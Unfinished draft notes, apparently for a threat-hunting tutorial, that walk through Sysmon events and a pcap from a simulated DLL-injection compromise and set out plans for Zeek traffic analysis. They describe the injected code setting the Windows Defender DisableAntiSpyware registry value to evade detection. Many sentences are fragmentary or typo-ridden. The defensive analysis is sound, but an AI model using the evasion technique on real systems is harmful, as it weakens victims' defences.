The final entry is more of the same, so for now that's that. Let's jump into the `Closing THoughts` where we'll zoom out and review exactly what we learned with our log analysis.  

# CLOSING THOUGHTS

So here's a quick recap of everything we've learned in our investigation thus far.

In our live analysis using native Windows tools we learned that:
- there was an outbound network connection mediated by `rundll32.exe`
- we 



- the main point here is really to lay out:

- what did we know when we arrived here based on memory analysis?
- what did we then learn from Sysmon.
- what did we then leanr from PowerShell

Remember redundancy is good - like many eyewitness accounts, each helps to strengthen the convicion of our case. 

Based on how we would expect an actual attack to occur, let's look at some of the most important Sysmon logs and what we learned from them.

DNS 22 - the stager reaching out to a web server to download the script, keep in mind ojnly with a FQDN so might not appear. 

Net Connection 3 - we can see powrshell.exe creating connection to web server. This is somethjing we'd alwayus expect to see, whether script used a FQDN or IP. Additionally we'd

Registry Change 3 - erc... 






- the first two represent us clearing the log
- 3 + 4 accessing processes windows doing its thing

now 5th one is the dns query, here is where things start getting interesting
this one is related to our IEX command - since it needs to go to a FQDN (raw.githubusercontent.com), it needs to use DNS.

{{< figure src="/img/image067.png" title="" class="custom-figure" >}}

6 is then establishing a network connection (ID 3), obvs sicne we just ran DNS we get the IP, establish a connection with the server hosting the script

{{< figure src="/img/image068.png" title="" class="custom-figure" >}}

7 is smartscreen

8 is explorer opening rufus, 9 is rufus closing, 10 is consent.exe, 11 again rufus opening

12 is vdsldr.exe, 13 is lsass, so is 14, 15 is vds.exe, 

16 is a big one = 13 (Registry value set)
we can see rufus is changing a registru

{{< figure src="/img/image069.png" title="" class="custom-figure" >}}

This registry key appears to be related to the Windows Defender's Group Policy settings. More specifically, the "DisableAntiSpyware" at the end suggests that this policy might control whether the anti-spyware component of Windows Defender is enabled or disabled.

Breaking down the registry key:

- "HKU" stands for HKEY_USERS, which contains the configuration data for all the user profiles on the computer.

- "S-1-5-21-3300832437-63900680-1611145449-1001" is the Security Identifier (SID) for a specific user account on the system.

- "SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy Objects" is where Group Policy Objects settings are stored.

- "{F1BFD3AE-2A88-41A2-989E-39817E08E286}Machine" identifies a specific Group Policy Object.

- "Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware" points to the policy controlling the anti-spyware feature of Windows Defender.

The Sysmon event ID 13 is associated with Registry Value Set operations. If you are seeing this in a Sysmon event, it suggests that this registry key value was modified. 

If the value of "DisableAntiSpyware" is set to 1, it means that the anti-spyware component of Windows Defender has been disabled for the user associated with the SID. If it's 0, then the feature is enabled. 

Please note that modifying this value could have significant security implications, as it would disable part of the built-in protection of the Windows system. If this change was not intended, it might be a sign of a security breach or malware attempting to lower system defenses.

The "Details DWORD (0x00000001)" indicates that the value of the registry key was set to "1". In the context of the "DisableAntiSpyware" key, this means that the anti-spyware component of Windows Defender has been disabled for the user account associated with the given Security Identifier (SID). 

It's also worth noting that this operation seems to be associated with the "rufus-4.1_x86.exe" executable, which is a utility used to create bootable USB drives. It's unusual for such a utility to interact with Windows Defender settings in this way. If this activity was not expected or initiated by a trusted user, it could potentially indicate a security issue, such as a breach or malware activity.

So this might suggest to us that when the script ran in dll injected into rufus, one of the very first thing it does is change this registry key to deactivate the feature, likely in an attempt to avoid detection

Alos observer around 2:04:38 everything happening at same time - moment injetion occurred

this then follows with 12 and 13, could be that svchost is trying to fix things again?
- will need to follow up and ask ChatGPT now being a moron

we then see a whole host of 10 - svchost, lsass - no need to worry about that for now

we then enter into event IDs 1 - a number of process creations.
all related to taskhostw.exe
for ex svchost.exe -k netsvcs -p
svchost.exe: This is the Service Host process, which is used to host multiple Windows operating system services. Each svchost.exe instance can run one or more services, and Windows uses multiple instances of svchost.exe to separate different services from each other.

-k: This flag is used to specify the service group that this instance of svchost.exe will host. In this case, the group is netsvcs, which is a group of important network-related services in Windows.

then ffwd to the end, the final event log is process creation of rundll32.exe

{{< figure src="/img/image070.png" title="" class="custom-figure" >}}

let's see here if imphash has any hits?
no result for MD5 on VT, but yes on joesandbox

***


# REFERENCES (this will be for both)
In case you wanted to learn more about Sysmon's ins and outs [see this talk](https://www.youtube.com/watch?v=6W6pXp6EojY). And if you really wanted to get in deep, which at some point I recommend you do, see [this playlist](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7) from TrustedSec. Finally here is another great talk by one of my favourite SANS instructors (Eric Conrad) on [using Sysmon for  Threat Hunting](https://www.youtube.com/watch?v=7dEfKn70HCI).







# TRAFFIC ANALYSIS
# Introduction

traffic analyssius one of most powerful ways to do threat hunting
but like every tool has strenghts and weaknesses

our specific investaition here, analyzing ane vent that was basicalkly only the initiiaal foothold, its weakness. 


For Traffic Analysis cIntroductyion
LIMITATION of traffic in this scenarion
- mention here that it's strength not really as much as others in deteceting intiail actions. Traffic is not great for finding individual actions, it's great for finding emergent patterns (time, session size etc), usually the longer period the better.

Here we only simulated an initial comprmoise, we did not really maintain a long perdio (1 day +) etc, communciating with server, sharing data etc. So


- first do the Threat Hunting Level 1 course
- then do the Chris Benton traffic analysis



- Let's first rerun attack (remember to drop cmd etc)
- redo pcap with just that
- then let's do threat hunting level 1, other vid courses teaching about c2 in traffic logs etc.



# FOR NOW REDO PCAP SO CLEANER


Ok our bew pcap has 584
first things of  interest seem to be 58 +59 - DNS query for the web server
we can look into second one and we can see that the ip for the URL was 185.199.108.133

then we see a whole series of convos between our IP and that IP, making connection, checking certs (TLS) etc

then 116 we can see ARP asking for IP of attacker, clearly now scipt has been injected and malware seeking to make conneciton back 

117 we can see response

then from 118 on we can see long convo between the two - victim and attacker 

let's follow convo see what's intersrting

- immediately what do we see? PE header - magic bytes + DOS stub
- then about 1/3 of way in we see what looks like a series of runtime errors


https://www.first.org/resources/papers/conference2010/cummings-slides.pdf

we see some strings, google it above 
can we save it and search it with YARA rule?? 

no, no positive hits with YARA

for now, let's abandon this since sidetrack

we can see it in course, find interesting, but say outside of scopt




we create a new folder, this is where output will go
we navigate to folder
we run the command
[full path to zeek] -r [full path to pcap]

analyst@analyst:~/Desktop/zeeklogs$ /opt/zeek/bin/zeek -r ~/Desktop/new_capture.pcapng 

when we do this it generates 6 logs


















+++++++++++++++++++++++++++++++++++




First, build a case mode UII


Second, Pareto Principle logging.












- mention this one usualyl more realm of SOC/SIEM and not Forensics, which usually more focus of threat hutning.
- Likely one of the thoughts underpinning this attitude is that logs are grunt-work, mountains of nothing that needs to be sifted through, mountains so huge its completly beyond the scope of humams, and so SIEMs not only CAN do it, but are better than humans in it. 

- but that is true for the general appraco to logs. But what we are speaking of here is a much specific way of looking at logs - limitiing the type of logs we look at. Additioarnlly, logs depending on the PHASE. See below - logs might not be a great place to start in Phase 1, but for example can be perfect for Phase 2. Sicne you already more or less know what you are looking for, makes the volume manageable, esp considering we're likely only interested in Sysmon, Powershell, and a highly select WEL IDs. 


ULTIMATELY, Phase 1 should focus on where they cannot hide - meaning memory and packets. Every where else, disk, logs, etc they can hide. but they can never hide from memory/packets = memory when they are at rest/use, packets when they are in transit. 


Ok so now as we go ahead, remember we have no idea of the attack, we don't know a DLL injected attack has happened, since that was "evil ash" doing it. Meaning we are in Phase 1, and then thios I might not mention but for own sanity - at end of live analysis II (PE Hacker), we can then switch over to Phase II.




Will be using same VM here, victim, in practice we would bnever do this,.



